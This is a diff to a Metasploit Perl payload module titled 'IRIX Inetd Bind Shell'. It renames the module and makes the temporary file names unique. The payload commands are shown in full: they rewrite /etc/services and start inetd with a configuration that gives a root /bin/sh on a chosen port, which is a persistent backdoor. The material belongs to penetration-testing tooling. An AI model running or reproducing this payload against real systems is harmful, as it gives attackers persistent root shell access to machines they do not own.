@@ -17,7 +17,7 @@ sub _Load {
 
 my $info =
 {
-  'Name'         => 'IRIX Inetd Bind Shell',
+  'Name'         => 'Irix Inetd Bind Shell',
   'Version'      => '$Revision$',
   'Description'  => 'Use inetd to create a persistent bindshell',
   'Authors'      => [ 'H D Moore <hdm [at] metasploit.com>', ],
@@ -40,12 +40,12 @@ sub CommandString {
   my $port = $self->GetVar('LPORT');
 
   my $command =
-  "grep -v msfbind /etc/services>/tmp/.msf_svcs;".
-  "echo msfbind $port/tcp>>/tmp/.msf_svcs;".
-  "cp /tmp/.msf_svcs /etc/services;".
-  "echo msfbind stream tcp nowait root /bin/sh sh>/tmp/.msf_inet;".
-  "/usr/etc/inetd /tmp/.msf_inet;".
-  "rm /tmp/.msf_inet;";
+  "grep -v msfbind /etc/services>/tmp/.msf_svcs$$;".
+  "echo msfbind $port/tcp>>/tmp/.msf_svcs$$;".
+  "cp /tmp/.msf_svcs$$ /etc/services;".
+  "echo msfbind stream tcp nowait root /bin/sh sh>/tmp/.msf_inet$$;".
+  "/usr/etc/inetd /tmp/.msf_inet$$;".
+  "rm /tmp/.msf_inet$$ /tmp/.msf_svcs$$;";
 
   return($command);
 }
